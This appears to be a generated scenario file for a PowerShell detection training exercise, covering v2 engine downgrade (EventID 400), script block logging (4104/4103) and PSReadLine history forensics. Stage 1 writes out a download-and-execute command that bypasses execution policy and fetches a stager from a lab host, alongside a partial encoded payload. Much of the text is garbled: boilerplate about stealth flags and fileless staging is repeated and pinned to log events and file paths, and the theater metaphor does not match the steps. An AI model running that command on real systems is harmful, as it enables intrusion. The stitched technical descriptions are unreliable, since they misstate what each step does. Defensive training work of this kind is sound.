scenario.name: Microsoft PowerShell Team, CISA & Mandiant DFIR — PowerShell EventID 4104 / 4103, Engine v2.0 Downgrade & PSReadLine History
scenario.overview: Imagine a classic downtown cinema theater with a glowing marquee ticket booth, red-carpet aisle, velvet stage curtains, warm spotlights, and an elevated projection room. Slipping past the red-carpet ticket booth during intermission, an impostor carrying a spare film canister walks backstage behind the heavy crimson velvet curtains. In this real-world scenario, the intruder smuggles copied records out past the red-carpet ticket booth in tiny disguised batches, then leaves a hidden spare latch behind so they can walk back into the cinema theater later. The theater manager checks the projection booth reel log against the marquee schedule and immediately halts the show upon spotting the swapped canister. In this scenario (T1562.001, Microsoft PowerShell Team, CISA & Mandiant DFIR, PowerShell EventID 4104 / 4103, Engine v2.0 Downgrade & PSReadLine History) at 10.10.4, the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: powerShell v2.0 Engine Downgrade Detection, then dynamic De-Obfuscation in Script Block, then persistent Interactive Command Recovery. Steps #1–#3 walk that chain end-to-end by covering PowerShell v2.0 Engine Downgrade Detection, then Dynamic De-Obfuscation in Script Block, then Persistent Interactive Command Recovery, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 11 with the documented host and network chain.

stages.title: Stage 1: PowerShell v2.0 Engine Downgrade Detection (Windows PowerShell EventID 400 EngineVersion=2.0)
stages.subtitle: Defense Evasion (T1562.001 - PowerShell v2.0 Downgrade Attack)
stages.description: Slipping past the red-carpet ticket booth during intermission, an impostor carrying a spare film canister walks backstage behind the heavy crimson velvet curtains. Specifically in Step 1, the intruder smuggles copied records out past the red-carpet ticket booth in tiny disguised batches while everyday visitors and the theater usher go about their routine. To evade AMSI and PowerShell v5 Script Block Logging, the attacker runs powershell.exe -Version 2 -NoP -Command "...". When the legacy .NET 2.0 CLR engine initializes, the classic "Windows PowerShell" event log records EventID 400 (Engine state is changed from None to Available) with HostVersion=5.1.19041.3570 juxtaposed against EngineVersion=2.0 (logged in WinEvent Event 400 with LogChannel=Windows PowerShell, EventID=400 , Engine Lifecycle, HostVersion=5.1.19041.3570, EngineVersion=2.0 , Downgrade Attack Detected so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.4.99/stager.ps1')" (which Launches powershell.exe with the -Version 2 downgrade switch, forcing the .NET Common Language Runtime to load the legacy CLR v2.0.50727 engine ins so that bypasses AMSI , AmsiScanBuffer and PowerShell v5 Constrained Language Mode / ScriptBlock Logging , T1562.001 during "PowerShell v2.0 Engine Downgrade Detection , Windows PowerShell EventID 400 EngineVersion=2.0", which defenders catch by correlating EngineVersion=2.0 in EventID 400/800). Next, the follow-up artifact LogName="Windows PowerShell" EventID=400: EngineVersion=2.0 | HostVersion=5.1.19041.3570 runs (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1562.001 during "PowerShell v2.0 Engine Downgrade Detection , Windows PowerShell EventID 400 EngineVersion=2.0" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). On the diagram, follow Step #1 / Link #1 (#1→ powershell.exe -Version 2 -NoProfile -Command "IEX ..." / ⇠#1 ACK 400) from Node ① (#1 Obfuscated PowerShell Stager) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 ConsoleHost_history.txt).

stages.title: Stage 2: Dynamic De-Obfuscation in Script Block Logging (EventID 4104) & Pipeline Binding (EventID 4103)
stages.subtitle: Execution (T1059.001 - PowerShell EventID 4104 Dynamic De-Obfuscation)
stages.description: Up in the darkened projection booth, the impostor swaps the scheduled feature reel for an altered copy before the theater lights dim again. Here in Step 2 inside the cinema theater, the intruder smuggles copied records out past the red-carpet ticket booth in tiny disguised batches without disturbing the front lobby concession counter. When v2 is disabled and the attacker runs a multi-layer Base64/XOR Invoke-Expression payload on PowerShell 5.1, every dynamic IEX evaluation passes a newly unpacked script block to System.Management.Automation, which logs the fully de-obfuscated plaintext code under Microsoft-Windows-PowerShell/Operational EventID 4104 (MessageNumber 1 of N, Level=Warning for suspicious APIs) and logs resolved parameter bindings under EventID 4103 (logged in WinEvent Event 4104 with LogChannel=Microsoft-Windows-PowerShell/Operational, EventID=4104 , Script Block Logging / 4103 , Module Pipeline, ScriptBlockId=8f19c2a0-4412-4b99-9120-aabbccddeeff, DeobfuscatedScript=[System.Reflection.Assembly]::Load, $bytes so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes Microsoft-Windows-PowerShell/Operational EventID 4104 (Execute a Remote Command / ScriptBlockText) (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1059.001 during "Dynamic De-Obfuscation in Script Block Logging , EventID 4104 & Pipeline Binding , EventID 4103" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). Next, the follow-up artifact Microsoft-Windows-PowerShell/Operational EventID 4103 (CommandInvocation / ParameterBinding) runs (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1059.001 during "Dynamic De-Obfuscation in Script Block Logging , EventID 4104 & Pipeline Binding , EventID 4103" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). On the diagram, follow Step #2 / Link #2 (#2→ powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... / ⇠#2 ACK 4104) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 System.Management.Automation), monitored by Node ⑥ (#6 ConsoleHost_history.txt).

stages.title: Stage 3: Persistent Interactive Command Recovery from PSReadLine ConsoleHost_history.txt
stages.subtitle: Collection (T1059.001 - PSReadLine ConsoleHost_history.txt Disk Artifact)
stages.description: As the velvet curtains part under the spotlights, the entire audience watches the substituted reel while the front lobby box office still lists the original movie title. In this final step inside the cinema theater, the intruder leaves a hidden spare latch behind so they can walk back into the cinema theater later until the projection booth reel log catches the mismatch. During interactive keyboard or pasted console sessions, the PowerShell PSReadLine module appends up to 4,096 commands directly to %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt on disk, even when InPrivate or Clear-History is invoked, preserving plaintext credentials and lateral movement commands for DFIR triage (logged in Sysmon Event 11 with ArtifactFile=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt, ModuleOrigin=PSReadLine , Default in Windows PowerShell 5.1 & PowerShell 7, EvidentiaryValue=Survives Clear-History cmdlet and session termination so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes Artifact Path: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1059.001 during "Persistent Interactive Command Recovery from PSReadLine ConsoleHost_history.txt" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). Next, the follow-up artifact Get-Content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt runs (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1059.001 during "Persistent Interactive Command Recovery from PSReadLine ConsoleHost_history.txt" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). On the diagram, follow Step #3 / Link #3 (#3→ PSReadLine writing interactive session history to ConsoleHost_history.txt / ⇠#3 ACK 11) from Node ③ (#3 System.Management.Automation) to Node ④ (#4 PowerShell Operational (4104)), monitored by Node ⑥ (#6 ConsoleHost_history.txt).

keySpecs.value: Include %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt across all user profiles in every Windows DFIR triage collection profile (such as KAPE PowerShell targets).
